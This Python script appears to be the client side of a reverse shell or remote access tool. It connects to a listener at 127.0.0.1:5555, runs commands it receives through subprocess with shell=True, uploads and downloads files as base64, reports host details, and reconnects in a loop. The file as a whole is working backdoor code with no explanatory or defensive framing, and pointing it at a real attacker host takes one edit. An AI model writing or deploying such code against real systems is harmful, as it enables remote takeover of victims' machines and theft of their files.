import socket
from termcolor import colored
import os
import subprocess
import json
import base64
import time
import platform
# -------------------------------------------------------------------------------
def reliable_send( data):
    json_data = json.dumps(data)
    s.send(json_data.encode())

def reliable_receive(s):
    json_data = ""
    while True:
        try:
            json_data += s.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

# Read file For Upload To Listener
def read_file(path):
    try:
        path = os.path.normpath(path)
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
    except Exception as e:
        return ("[-] Error " + str(e)[10:])
    
# Download File From Listener
def write_file( path, content):
    try:
        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        file_path = os.path.join(desktop_path, path)
        # print(desktop_path)
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"
    except Exception as e:
        return ("[-] Upload Unsuccessful")


# -------------------------------------------------------------------------------

def socket_create():
    try:
        global host
        global port
        global s
        host = '127.0.0.1'
        port = 5555
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " , str(msg))
        time.sleep(5)
        socket_create()


# Receive command from remote server and run on local machine
def receive_commands():
    while True:
        # data = s.recv(20480).decode()
        received_command = reliable_receive(s)
        print(received_command)
        
        if received_command[0] == 'cd':
            try:
                os.chdir(received_command[1])
            except:
                pass
            
        elif received_command[0] in ['quit', 'exit']:
            s.close()
            break

        elif received_command[0] == "upload":
            file_path = received_command[2]
            file_name = os.path.basename(received_command[1])
            
            file_path = os.path.join(file_path, file_name)
            command_result = write_file(path=file_path, content=received_command[3])
            

        elif received_command[0] == "download":
            command_result = read_file(received_command[1])

        else:
            command_result = execute_command(received_command)
        
        
        if received_command[0] == "whoami":
            reliable_send(get_system_info())
        else:
            reliable_send([command_result , "\n[ " + os.getcwd() + " ]>"])
            
            
        

    s.close() 

def get_system_info():
    sysInfo = platform.uname()
    USER = "?"
    SYSTEM =  "?"
    VERSION = "?"
    try:
        USER = sysInfo.node
        SYSTEM =  sysInfo.system
        VERSION = sysInfo.version
    except:
        pass
    
    return [USER,SYSTEM, VERSION]
    
# Execute command
def execute_command(received_command):
    try:
        return subprocess.check_output(received_command, shell=True).decode()
        
    except Exception as ex:
        output_str = "Command not recognize"
        print(colored(output_str,"red"))
        print(colored(ex,"yellow"))
        return output_str
        # s.send(output_str.encode() + (os.getcwd() + "> ").encode())
        # reliable_send(output_str + ("\n[ " + os.getcwd() + " ]> "))
        print("-----------------------------------")


def main():
    while True:
        global s
        try:
            socket_create()

            socket_connect()
       
            try:
                receive_commands()
            except Exception as ex:
                continue
            
        except  socket.error as ex:
            print(colored("Error in main", "red"))
            print( ex)
            time.sleep(5)
            
        s.close()
        main()


main()
    
